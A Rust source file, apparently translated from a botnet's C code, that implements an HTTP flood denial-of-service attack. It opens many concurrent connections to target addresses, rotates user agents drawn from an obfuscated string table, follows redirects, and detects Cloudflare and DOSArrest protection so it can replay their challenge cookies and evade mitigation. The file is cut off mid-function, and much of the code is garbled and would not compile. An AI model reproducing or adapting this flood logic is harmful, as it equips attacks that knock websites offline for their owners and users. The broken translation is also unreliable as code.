use std::ffi::CString;
use std::net::Ipv4Addr;
use std::os::unix::io::RawFd;
use std::ptr;
use std::time::Duration;
use std::mem::zeroed;
use std::slice;
use std::sync::atomic::{AtomicU32, Ordering};

use libc::{sockaddr_in, AF_INET, SOCK_STREAM, socket, connect, setsockopt, fcntl, close, select, timeval, FD_SET, FD_ZERO, MSG_NOSIGNAL, O_NONBLOCK, SOL_SOCKET, SO_RCVBUF};
use libc::{c_int, c_void};
use libc::{FD_SETSIZE, FD_ISSET};

type BOOL = bool;
type uint8_t = u8;
type uint32_t = u32;
type port_t = u16;
type socklen_t = u32;

const HTTP_PATH_MAX: usize = 256;
const HTTP_DOMAIN_MAX: usize = 128;
const HTTP_CONNECTION_MAX: usize = 256;
const HTTP_RDBUF_SIZE: usize = 8192;
const HTTP_COOKIE_MAX: usize = 8;
const HTTP_COOKIE_LEN_MAX: usize = 256;
const HTTP_HACK_DRAIN: usize = 64;

#[repr(C)]
struct AttackTarget {
    sock_addr: sockaddr_in,
    addr: Ipv4Addr,
    netmask: uint8_t,
}

#[repr(C)]
struct AttackOption {
    val: CString,
    key: uint8_t,
}

#[repr(C)]
struct AttackHttpState {
    state: HttpState,
    fd: RawFd,
    dst_addr: u32,
    last_recv: u32,
    last_send: u32,
    keepalive: bool,
    chunked: bool,
    content_length: i32,
    protection_type: u32,
    num_cookies: u32,
    rdbuf: [u8; HTTP_RDBUF_SIZE],
    rdbuf_pos: usize,
    cookies: [[u8; HTTP_COOKIE_LEN_MAX]; HTTP_COOKIE_MAX],
    domain: [u8; HTTP_DOMAIN_MAX],
    path: [u8; HTTP_PATH_MAX],
    method: [u8; 16],
    orig_method: [u8; 16],
    user_agent: [u8; 256],
}

#[repr(u8)]
enum HttpState {
    HTTP_CONN_INIT,
    HTTP_CONN_CONNECTING,
    HTTP_CONN_SEND,
    HTTP_CONN_RECV_HEADER,
    HTTP_CONN_RECV_BODY,
    HTTP_CONN_RESTART,
    HTTP_CONN_QUEUE_RESTART,
    HTTP_CONN_CLOSED,
    HTTP_CONN_SEND_HEADERS,
    HTTP_CONN_SEND_JUNK,
    HTTP_CONN_SNDBUF_WAIT,
}

fn attack_app_http(targs_len: uint8_t, targs: *mut AttackTarget, opts_len: uint8_t, opts: *const AttackOption) {
    unsafe {
        let mut rfd: i32;
        let mut ret = 0;
        let mut http_table: *mut AttackHttpState = ptr::null_mut();
        let postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, ptr::null());
        let method = attack_get_opt_str(opts_len, opts, ATK_OPT_METHOD, b"GET\0".as_ptr());
        let domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, ptr::null());
        let path = attack_get_opt_str(opts_len, opts, ATK_OPT_PATH, b"/\0".as_ptr());
        let sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1) as usize;
        let dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80) as port_t;

        let mut generic_memes: [u8; 10241] = [0; 10241];

        if domain.is_null() || path.is_null() {
            return;
        }

        if util_strlen(path) > HTTP_PATH_MAX - 1 || util_strlen(domain) > HTTP_DOMAIN_MAX - 1 || util_strlen(method) > 9 {
            return;
        }

        for ii in 0..util_strlen(method) {
            if *method.add(ii) >= b'a' && *method.add(ii) <= b'z' {
                *method.add(ii) -= 32;
            }
        }

        let sockets = if sockets > HTTP_CONNECTION_MAX { HTTP_CONNECTION_MAX } else { sockets };

        table_unlock_val(TABLE_ATK_SET_COOKIE);
        table_unlock_val(TABLE_ATK_REFRESH_HDR);
        table_unlock_val(TABLE_ATK_LOCATION_HDR);
        table_unlock_val(TABLE_ATK_SET_COOKIE_HDR);
        table_unlock_val(TABLE_ATK_CONTENT_LENGTH_HDR);
        table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
        table_unlock_val(TABLE_ATK_CHUNKED);
        table_unlock_val(TABLE_ATK_KEEP_ALIVE_HDR);
        table_unlock_val(TABLE_ATK_CONNECTION_HDR);
        table_unlock_val(TABLE_ATK_DOSARREST);
        table_unlock_val(TABLE_ATK_CLOUDFLARE_NGINX);

        http_table = libc::calloc(sockets, std::mem::size_of::<AttackHttpState>()) as *mut AttackHttpState;

        for i in 0..sockets {
            (*http_table.add(i)).state = HttpState::HTTP_CONN_INIT;
            (*http_table.add(i)).fd = -1;
            (*http_table.add(i)).dst_addr = (*targs.add(i % targs_len as usize)).addr.into();

            util_strcpy((*http_table.add(i)).path.as_mut_ptr(), path);

            if (*http_table.add(i)).path[0] != b'/' {
                libc::memmove((*http_table.add(i)).path.as_mut_ptr().add(1) as *mut c_void, (*http_table.add(i)).path.as_mut_ptr() as *mut c_void, util_strlen((*http_table.add(i)).path.as_mut_ptr()));
                (*http_table.add(i)).path[0] = b'/';
            }

            util_strcpy((*http_table.add(i)).orig_method.as_mut_ptr(), method);
            util_strcpy((*http_table.add(i)).method.as_mut_ptr(), method);
            util_strcpy((*http_table.add(i)).domain.as_mut_ptr(), domain);

            if (*targs.add(i % targs_len as usize)).netmask < 32 {
                (*http_table.add(i)).dst_addr = htonl(ntohl((*targs.add(i % targs_len as usize)).addr.into()) + (rand_next() >> (*targs.add(i % targs_len as usize)).netmask));
            }

            match rand_next() % 5 {
                0 => {
                    table_unlock_val(TABLE_HTTP_ONE);
                    util_strcpy((*http_table.add(i)).user_agent.as_mut_ptr(), table_retrieve_val(TABLE_HTTP_ONE, ptr::null_mut()));
                    table_lock_val(TABLE_HTTP_ONE);
                }
                1 => {
                    table_unlock_val(TABLE_HTTP_TWO);
                    util_strcpy((*http_table.add(i)).user_agent.as_mut_ptr(), table_retrieve_val(TABLE_HTTP_TWO, ptr::null_mut()));
                    table_lock_val(TABLE_HTTP_TWO);
                }
                2 => {
                    table_unlock_val(TABLE_HTTP_THREE);
                    util_strcpy((*http_table.add(i)).user_agent.as_mut_ptr(), table_retrieve_val(TABLE_HTTP_THREE, ptr::null_mut()));
                    table_lock_val(TABLE_HTTP_THREE);
                }
                3 => {
                    table_unlock_val(TABLE_HTTP_FOUR);
                    util_strcpy((*http_table.add(i)).user_agent.as_mut_ptr(), table_retrieve_val(TABLE_HTTP_FOUR, ptr::null_mut()));
                    table_lock_val(TABLE_HTTP_FOUR);
                }
                4 => {
                    table_unlock_val(TABLE_HTTP_FIVE);
                    util_strcpy((*http_table.add(i)).user_agent.as_mut_ptr(), table_retrieve_val(TABLE_HTTP_FIVE, ptr::null_mut()));
                    table_lock_val(TABLE_HTTP_FIVE);
                }
                _ => {}
            }
        }

        while true {
            let mut fdset_rd = zeroed();
            let mut fdset_wr = zeroed();
            let mut mfd = 0;
            let mut nfds: c_int;
            let mut tim = timeval {
                tv_sec: 1,
                tv_usec: 0,
            };
            let mut fake_time = time(std::ptr::null_mut());

            FD_ZERO(&mut fdset_rd);
            FD_ZERO(&mut fdset_wr);

            for i in 0..sockets {
                let conn = &mut *http_table.add(i);

                if conn.state == HttpState::HTTP_CONN_RESTART {
                    if conn.keepalive {
                        conn.state = HttpState::HTTP_CONN_SEND;
                    } else {
                        conn.state = HttpState::HTTP_CONN_INIT;
                    }
                }

                if conn.state == HttpState::HTTP_CONN_INIT {
                    let mut addr: sockaddr_in = zeroed();

                    if conn.fd != -1 {
                        close(conn.fd);
                    }
                    conn.fd = socket(AF_INET, SOCK_STREAM, 0);
                    if conn.fd == -1 {
                        continue;
                    }

                    fcntl(conn.fd, F_SETFL, O_NONBLOCK | fcntl(conn.fd, F_GETFL, 0));

                    let mut ii = 65535;
                    setsockopt(conn.fd, SOL_SOCKET, SO_RCVBUF, &mut ii as *mut _ as *mut c_void, std::mem::size_of::<c_int>() as socklen_t);

                    addr.sin_family = AF_INET as u16;
                    addr.sin_addr.s_addr = conn.dst_addr;
                    addr.sin_port = htons(dport);

                    conn.last_recv = fake_time;
                    conn.state = HttpState::HTTP_CONN_CONNECTING;
                    connect(conn.fd, &addr as *const _ as *const sockaddr, std::mem::size_of::<sockaddr_in>() as socklen_t);
                    FD_SET(conn.fd, &mut fdset_wr);
                    if conn.fd > mfd {
                        mfd = conn.fd + 1;
                    }
                } else if conn.state == HttpState::HTTP_CONN_CONNECTING {
                    if fake_time - conn.last_recv > 30 {
                        conn.state = HttpState::HTTP_CONN_INIT;
                        close(conn.fd);
                        conn.fd = -1;
                        continue;
                    }

                    FD_SET(conn.fd, &mut fdset_wr);
                    if conn.fd > mfd {
                        mfd = conn.fd + 1;
                    }
                } else if conn.state == HttpState::HTTP_CONN_SEND {
                    conn.content_length = -1;
                    conn.protection_type = 0;
                    util_zero(conn.rdbuf.as_mut_ptr(), HTTP_RDBUF_SIZE);
                    conn.rdbuf_pos = 0;

                    let mut buf = [0u8; 10240];
                    util_zero(buf.as_mut_ptr(), 10240);

                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), conn.method.as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b" ".as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), conn.path.as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b" HTTP/1.1\r\nUser-Agent: ".as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), conn.user_agent.as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\nHost: ".as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), conn.domain.as_ptr());
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());

                    table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, ptr::null_mut()));
                    table_lock_val(TABLE_ATK_KEEP_ALIVE);
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());

                    table_unlock_val(TABLE_ATK_ACCEPT);
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), table_retrieve_val(TABLE_ATK_ACCEPT, ptr::null_mut()));
                    table_lock_val(TABLE_ATK_ACCEPT);
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());

                    table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, ptr::null_mut()));
                    table_lock_val(TABLE_ATK_ACCEPT_LNG);
                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());

                    if !postdata.is_null() {
                        table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, ptr::null_mut()));
                        table_lock_val(TABLE_ATK_CONTENT_TYPE);

                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, ptr::null_mut()));
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b" ".as_ptr());
                        util_itoa(util_strlen(postdata) as i32, 10, buf.as_mut_ptr().add(util_strlen(buf.as_ptr())));
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());
                    }

                    if conn.num_cookies > 0 {
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"Cookie: ".as_ptr());
                        for ii in 0..conn.num_cookies {
                            util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), conn.cookies[ii as usize].as_ptr());
                            util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"; ".as_ptr());
                        }
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());
                    }

                    util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), b"\r\n".as_ptr());

                    if !postdata.is_null() {
                        util_strcpy(buf.as_mut_ptr().add(util_strlen(buf.as_ptr())), postdata);
                    }

                    if !util_strcmp(conn.method.as_ptr(), conn.orig_method.as_ptr()) {
                        util_strcpy(conn.method.as_mut_ptr(), conn.orig_method.as_ptr());
                    }

                    send(conn.fd, buf.as_ptr() as *const _, util_strlen(buf.as_ptr()), MSG_NOSIGNAL);
                    conn.last_send = fake_time;

                    conn.state = HttpState::HTTP_CONN_RECV_HEADER;
                    FD_SET(conn.fd, &mut fdset_rd);
                    if conn.fd > mfd {
                        mfd = conn.fd + 1;
                    }
                } else if conn.state == HttpState::HTTP_CONN_RECV_HEADER {
                    FD_SET(conn.fd, &mut fdset_rd);
                    if conn.fd > mfd {
                        mfd = conn.fd + 1;
                    }
                } else if conn.state == HttpState::HTTP_CONN_RECV_BODY {
                    FD_SET(conn.fd, &mut fdset_rd);
                    if conn.fd > mfd {
                        mfd = conn.fd + 1;
                    }
                } else if conn.state == HttpState::HTTP_CONN_QUEUE_RESTART {
                    FD_SET(conn.fd, &mut fdset_rd);
                    if conn.fd > mfd {
                        mfd = conn.fd + 1;
                    }
                } else if conn.state == HttpState::HTTP_CONN_CLOSED {
                    conn.state = HttpState::HTTP_CONN_INIT;
                    close(conn.fd);
                    conn.fd = -1;
                } else {
                    conn.state = HttpState::HTTP_CONN_INIT;
                    close(conn.fd);
                    conn.fd = -1;
                }
            }

            if mfd == 0 {
                continue;
            }

            nfds = select(mfd, &mut fdset_rd, &mut fdset_wr, ptr::null_mut(), &mut tim);
            fake_time = time(ptr::null_mut());

            if nfds < 1 {
                continue;
            }

            for i in 0..sockets {
                let conn = &mut *http_table.add(i);

                if conn.fd == -1 {
                    continue;
                }

                if FD_ISSET(conn.fd, &mut fdset_wr) {
                    let mut err = 0;
                    let mut err_len = std::mem::size_of::<c_int>() as socklen_t;

                    ret = getsockopt(conn.fd, SOL_SOCKET, SO_ERROR, &mut err as *mut _ as *mut c_void, &mut err_len);
                    if err == 0 && ret == 0 {
                        conn.state = HttpState::HTTP_CONN_SEND;
                    } else {
                        close(conn.fd);
                        conn.fd = -1;
                        conn.state = HttpState::HTTP_CONN_INIT;
                        continue;
                    }
                }

                if FD_ISSET(conn.fd, &mut fdset_rd) {
                    if conn.state == HttpState::HTTP_CONN_RECV_HEADER {
                        let mut processed = 0;

                        util_zero(generic_memes.as_mut_ptr(), 10240);
                        ret = recv(conn.fd, generic_memes.as_mut_ptr() as *mut _, 10240, MSG_NOSIGNAL | MSG_PEEK);
                        if ret < 1 {
                            close(conn.fd);
                            conn.fd = -1;
                            conn.state = HttpState::HTTP_CONN_INIT;
                            continue;
                        }

                        if util_memsearch(generic_memes.as_ptr(), ret as usize, b"\r\n\r\n".as_ptr(), 4) == -1 && ret < 10240 {
                            continue;
                        }

                        generic_memes[util_memsearch(generic_memes.as_ptr(), ret as usize, b"\r\n\r\n".as_ptr(), 4) as usize] = 0;

                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_CLOUDFLARE_NGINX, ptr::null_mut())) != -1 {
                            conn.protection_type = HTTP_PROT_CLOUDFLARE;
                        }

                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_DOSARREST, ptr::null_mut())) != -1 {
                            conn.protection_type = HTTP_PROT_DOSARREST;
                        }

                        conn.keepalive = false;
                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, ptr::null_mut())) != -1 {
                            let mut offset = util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_CONNECTION_HDR, ptr::null_mut())) as usize;
                            if generic_memes[offset] == b' ' {
                                offset += 1;
                            }

                            let nl_off = util_memsearch(generic_memes.as_ptr().add(offset), ret as usize - offset, b"\r\n".as_ptr(), 2);
                            if nl_off != -1 {
                                let con_ptr = &mut generic_memes[offset] as *mut _;

                                if nl_off >= 2 {
                                    generic_memes[offset + (nl_off as usize) - 2] = 0;
                                }

                                if util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_KEEP_ALIVE_HDR, ptr::null_mut())) != -1 {
                                    conn.keepalive = true;
                                }
                            }
                        }

                        conn.chunked = false;
                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, ptr::null_mut())) != -1 {
                            let mut offset = util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, ptr::null_mut())) as usize;
                            if generic_memes[offset] == b' ' {
                                offset += 1;
                            }

                            let nl_off = util_memsearch(generic_memes.as_ptr().add(offset), ret as usize - offset, b"\r\n".as_ptr(), 2);
                            if nl_off != -1 {
                                let con_ptr = &mut generic_memes[offset] as *mut _;

                                if nl_off >= 2 {
                                    generic_memes[offset + (nl_off as usize) - 2] = 0;
                                }

                                if util_stristr(con_ptr, util_strlen(con_ptr), table_retrieve_val(TABLE_ATK_CHUNKED, ptr::null_mut())) != -1 {
                                    conn.chunked = true;
                                }
                            }
                        }

                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, ptr::null_mut())) != -1 {
                            let mut offset = util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_CONTENT_LENGTH_HDR, ptr::null_mut())) as usize;
                            if generic_memes[offset] == b' ' {
                                offset += 1;
                            }

                            let nl_off = util_memsearch(generic_memes.as_ptr().add(offset), ret as usize - offset, b"\r\n".as_ptr(), 2);
                            if nl_off != -1 {
                                let len_ptr = &mut generic_memes[offset] as *mut _;

                                if nl_off >= 2 {
                                    generic_memes[offset + (nl_off as usize) - 2] = 0;
                                }

                                conn.content_length = util_atoi(len_ptr, 10);
                            }
                        } else {
                            conn.content_length = 0;
                        }

                        processed = 0;
                        while util_stristr(generic_memes.as_ptr().add(processed), ret as usize, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, ptr::null_mut())) != -1 && conn.num_cookies < HTTP_COOKIE_MAX {
                            let mut offset = util_stristr(generic_memes.as_ptr().add(processed), ret as usize, table_retrieve_val(TABLE_ATK_SET_COOKIE_HDR, ptr::null_mut())) as usize;
                            if generic_memes[processed + offset] == b' ' {
                                offset += 1;
                            }

                            let nl_off = util_memsearch(generic_memes.as_ptr().add(processed + offset), ret as usize - processed - offset, b"\r\n".as_ptr(), 2);
                            if nl_off != -1 {
                                let cookie_ptr = &mut generic_memes[processed + offset] as *mut _;

                                if nl_off >= 2 {
                                    generic_memes[processed + offset + (nl_off as usize) - 2] = 0;
                                }

                                for ii in 0..util_strlen(cookie_ptr) {
                                    if *cookie_ptr.add(ii) == b'=' {
                                        break;
                                    }
                                }

                                if *cookie_ptr.add(ii) == b'=' {
                                    let equal_off = ii;
                                    let mut cookie_exists = false;

                                    for ii in 0..conn.num_cookies {
                                        if util_strncmp(cookie_ptr, conn.cookies[ii as usize].as_ptr(), equal_off as usize) != 0 {
                                            cookie_exists = true;
                                            break;
                                        }
                                    }

                                    if !cookie_exists {
                                        if util_strlen(cookie_ptr) < HTTP_COOKIE_LEN_MAX {
                                            util_strcpy(conn.cookies[conn.num_cookies as usize].as_mut_ptr(), cookie_ptr);
                                            util_strcpy(conn.cookies[conn.num_cookies as usize].as_mut_ptr().add(util_strlen(conn.cookies[conn.num_cookies as usize].as_ptr())), b"=".as_ptr());

                                            let start_pos = processed + offset + equal_off + 1;
                                            let end_pos = util_memsearch(generic_memes.as_ptr().add(start_pos), ret as usize - start_pos, b";".as_ptr(), 1);
                                            if end_pos > 0 {
                                                conn.cookies[conn.num_cookies as usize].as_mut_ptr().add(util_strlen(conn.cookies[conn.num_cookies as usize].as_ptr())).copy_from_nonoverlapping(generic_memes.as_ptr().add(start_pos), end_pos as usize);
                                            }

                                            conn.num_cookies += 1;
                                        }
                                    }
                                }
                            }

                            processed += offset;
                        }

                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_LOCATION_HDR, ptr::null_mut())) != -1 {
                            let mut offset = util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_LOCATION_HDR, ptr::null_mut())) as usize;
                            if generic_memes[offset] == b' ' {
                                offset += 1;
                            }

                            let nl_off = util_memsearch(generic_memes.as_ptr().add(offset), ret as usize - offset, b"\r\n".as_ptr(), 2);
                            if nl_off != -1 {
                                let loc_ptr = &mut generic_memes[offset] as *mut _;

                                if nl_off >= 2 {
                                    generic_memes[offset + (nl_off as usize) - 2] = 0;
                                }

                                let nl_off = nl_off + 1;

                                if util_memsearch(loc_ptr, nl_off, b"http".as_ptr(), 4) == 4 {
                                    let mut ii = 7;
                                    if loc_ptr.add(4).read() == b's' {
                                        ii += 1;
                                    }

                                    libc::memmove(loc_ptr as *mut c_void, loc_ptr.add(ii) as *const c_void, (nl_off as usize) - ii);
                                    let mut ii = 0;
                                    while *loc_ptr.add(ii) != 0 {
                                        if *loc_ptr.add(ii) == b'/' {
                                            *loc_ptr.add(ii) = 0;
                                            break;
                                        }
                                        ii += 1;
                                    }

                                    if util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX {
                                        util_strcpy(conn.domain.as_mut_ptr(), loc_ptr);
                                    }

                                    if util_strlen(loc_ptr.add(ii + 1)) < HTTP_PATH_MAX {
                                        util_zero(conn.path.as_mut_ptr().add(1), HTTP_PATH_MAX - 1);
                                        if util_strlen(loc_ptr.add(ii + 1)) > 0 {
                                            util_strcpy(conn.path.as_mut_ptr().add(1), loc_ptr.add(ii + 1));
                                        }
                                    }
                                } else if *loc_ptr == b'/' {
                                    util_zero(conn.path.as_mut_ptr().add(1), HTTP_PATH_MAX - 1);
                                    if util_strlen(loc_ptr.add(ii + 1)) > 0 && util_strlen(loc_ptr.add(ii + 1)) < HTTP_PATH_MAX {
                                        util_strcpy(conn.path.as_mut_ptr().add(1), loc_ptr.add(ii + 1));
                                    }
                                }

                                conn.state = HttpState::HTTP_CONN_RESTART;
                                continue;
                            }
                        }

                        if util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_REFRESH_HDR, ptr::null_mut())) != -1 {
                            let mut offset = util_stristr(generic_memes.as_ptr(), ret as usize, table_retrieve_val(TABLE_ATK_REFRESH_HDR, ptr::null_mut())) as usize;
                            if generic_memes[offset] == b' ' {
                                offset += 1;
                            }

                            let nl_off = util_memsearch(generic_memes.as_ptr().add(offset), ret as usize - offset, b"\r\n".as_ptr(), 2);
                            if nl_off != -1 {
                                let loc_ptr = &mut generic_memes[offset] as *mut _;

                                if nl_off >= 2 {
                                    generic_memes[offset + (nl_off as usize) - 2] = 0;
                                }

                                let nl_off = nl_off + 1;

                                let mut ii = 0;

                                while *loc_ptr.add(ii) != 0 && *loc_ptr.add(ii) >= b'0' && *loc_ptr.add(ii) <= b'9' {
                                    ii += 1;
                                }

                                if *loc_ptr.add(ii) != 0 {
                                    let mut wait_time = 0;
                                    *loc_ptr.add(ii) = 0;
                                    ii += 1;

                                    if *loc_ptr.add(ii) == b' ' {
                                        ii += 1;
                                    }

                                    if util_stristr(loc_ptr.add(ii), util_strlen(loc_ptr.add(ii)), b"url=".as_ptr()) != -1 {
                                        ii += util_stristr(loc_ptr.add(ii), util_strlen(loc_ptr.add(ii)), b"url=".as_ptr());
                                    }

                                    if *loc_ptr.add(ii) == b'"' {
                                        ii += 1;

                                        if *loc_ptr.add(ii + util_strlen(loc_ptr.add(ii))) == b'"' {
                                            *loc_ptr.add(ii + util_strlen(loc_ptr.add(ii))) = 0;
                                        }
                                    }

                                    wait_time = util_atoi(loc_ptr, 10);

                                    while wait_time > 0 && wait_time < 10 && fake_time + wait_time as u32 > time(ptr::null_mut()) {
                                        libc::sleep(1);
                                    }

                                    let loc_ptr = &mut *loc_ptr.add(ii);

                                    if util_stristr(loc_ptr, util_strlen(loc_ptr), b"http".as_ptr()) == 4 {
                                        let mut ii = 7;
                                        if loc_ptr.add(4).read() == b's' {
                                            ii += 1;
                                        }

                                        libc::memmove(loc_ptr as *mut c_void, loc_ptr.add(ii) as *const c_void, (nl_off as usize) - ii);
                                        let mut ii = 0;
                                        while *loc_ptr.add(ii) != 0 {
                                            if *loc_ptr.add(ii) == b'/' {
                                                *loc_ptr.add(ii) = 0;
                                                break;
                                            }
                                            ii += 1;
                                        }

                                        if util_strlen(loc_ptr) > 0 && util_strlen(loc_ptr) < HTTP_DOMAIN_MAX {
                                            util_strcpy(conn.domain.as_mut_ptr(), loc_ptr);
                                        }

                                        if util_strlen(loc_ptr.add(ii + 1)) < HTTP_PATH_MAX {
                                            util_zero(conn.path.as_mut_ptr().add(1), HTTP_PATH_MAX - 1);
                                            if util_strlen(loc_ptr.add(ii + 1)) > 0 {
                                                util_strcpy(conn.path.as_mut_ptr().add(1), loc_ptr.add(ii + 1));
                                            }
                                        }
                                    } else if *loc_ptr == b'/' {
                                        if util_strlen(loc_ptr.add(ii + 1)) < HTTP_PATH_MAX {
                                            util_zero(conn.path.as_mut_ptr().add(1), HTTP_PATH_MAX - 1);
                                            if util_strlen(loc_ptr.add(ii + 1)) > 0 {
                                                util_strcpy(conn.path.as_mut_ptr().add(1), loc_ptr.add(ii + 1));
                                            }
                                        }
                                    }

                                    conn.method.copy_from_slice(b"GET\0");
                                    conn.state = HttpState::HTTP_CONN_QUEUE_RESTART;
                                    continue;
                                }
                            }
                        }

                        let processed = util_memsearch(generic_memes.as_ptr(), ret as usize, b"\r\n\r\n".as_ptr(), 4);
                        if !util_strcmp(conn.method.as_ptr(), b"POST") || !util_strcmp(conn.method.as_ptr(), b"GET") {
                            conn.state = HttpState::HTTP_CONN_RECV_BODY;
                        } else if ret > processed {
                            conn.state = HttpState::HTTP_CONN_QUEUE_RESTART;
                        } else {
                            conn.state = HttpState::HTTP_CONN_RESTART;
                        }

                        ret = recv(conn.fd, generic_memes.as_mut_ptr() as *mut _, processed as usize, MSG_NOSIGNAL);
                    } else if conn.state == HttpState::HTTP_CONN_RECV_BODY {
                        loop {
                            if conn.state != HttpState::HTTP_CONN_RECV_BODY {
                                break;
                            }

                            if conn.rdbuf_pos == HTTP_RDBUF_SIZE {
                                libc::memmove(conn.rdbuf.as_mut_ptr() as *mut c_void, conn.rdbuf.as_mut_ptr().add(HTTP_HACK_DRAIN) as *mut c_void, HTTP_RDBUF_SIZE - HTTP_HACK_DRAIN);
                                conn.rdbuf_pos -= HTTP_HACK_DRAIN;
                            }
                            errno = 0;
                            ret = recv(conn.fd, conn.rdbuf.as_mut_ptr().add(conn.rdbuf_pos) as *mut _, HTTP_RDBUF_SIZE - conn.rdbuf_pos, MSG_NOSIGNAL);
                            if ret == 0 {
                                errno = libc::ECONNRESET;
                                ret = -1;
                            }
                            if ret == -1 {
                                if errno != libc::EAGAIN && errno != libc::EWOULDBLOCK {
                                    close(conn.fd);
                                    conn.fd = -1;
                                    conn.state = HttpState::HTTP_CONN_INIT;
                                }
                                break;
                            }

                            conn.rdbuf_pos += ret as usize;
                            conn.last_recv = fake_time;

                            loop {
                                let mut consumed = 0;

                                if conn.content_length > 0 {
                                    consumed = if conn.content_length > conn.rdbuf_pos as i32 { conn.rdbuf_pos as i32 } else { conn.content_length };
                                    conn.content_length -= consumed;

                                    if conn.protection_type == HTTP_PROT_DOSARREST {
                                        if util_memsearch(conn.rdbuf.as_ptr(), conn.rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, ptr::null_mut()), 11) != -1 {
                                            let start_pos = util_memsearch(conn.rdbuf.as_ptr(), conn.rdbuf_pos, table_retrieve_val(TABLE_ATK_SET_COOKIE, ptr::null_mut()), 11);
                                            let end_pos = util_memsearch(conn.rdbuf.as_ptr().add(start_pos as usize), conn.rdbuf_pos - start_pos as usize, b"'".as_ptr(), 1);
                                            conn.rdbuf[start_pos as usize + (end_pos as usize - 1)] = 0;

                                            if conn.num_cookies < HTTP_COOKIE_MAX as u32 && util_strlen(conn.rdbuf.as_ptr().add(start_pos as usize)) < HTTP_COOKIE_LEN_MAX {
                                                util_strcpy(conn.cookies[conn.num_cookies as usize].as_mut_ptr(), conn.rdbuf.as_ptr().add(start_pos as usize));
                                                util_strcpy(conn.cookies[conn.num_cookies as usize].as_mut_ptr().add(util_strlen(conn.cookies[conn.num_cookies as usize].as_ptr())), b"=".as_ptr());

                                                let start_pos = start_pos as usize + end_pos as usize + 3;
                                                let end_pos = util_memsearch(conn.rdbuf.as_ptr().add(start_pos), conn.rdbuf_pos - start_pos, b"'".as_ptr(), 1);
                                                conn.rdbuf[start_pos + end_pos as usize - 1] = 0;

                                                util_strcpy(conn.cookies[conn.num_cookies as usize].as_mut_ptr().add(util_strlen(conn.cookies[conn.num_cookies as usize].as_ptr())), conn.rdbuf.as_ptr().add(start_pos));
                                                conn.num_cookies += 1;
                                            }

                                            conn.content_length = -1;
                                            conn.state = HttpState::HTTP_CONN_QUEUE_RESTART;
                                            break;
                                        }
                                    }
                                }

                                if conn.content_length == 0 {
                                    if conn.chunked {
                                        if util_memsearch(conn.rdbuf.as_ptr(), conn.rdbuf_pos, b"\r\n".as_ptr(), 2) != -1 {
                                            let new_line_pos = util_memsearch(conn.rdbuf.as_ptr(), conn.rdbuf_pos, b"\r\n".as_ptr(), 2);
                                            conn.rdbuf[new_line_pos as usize - 2] = 0;
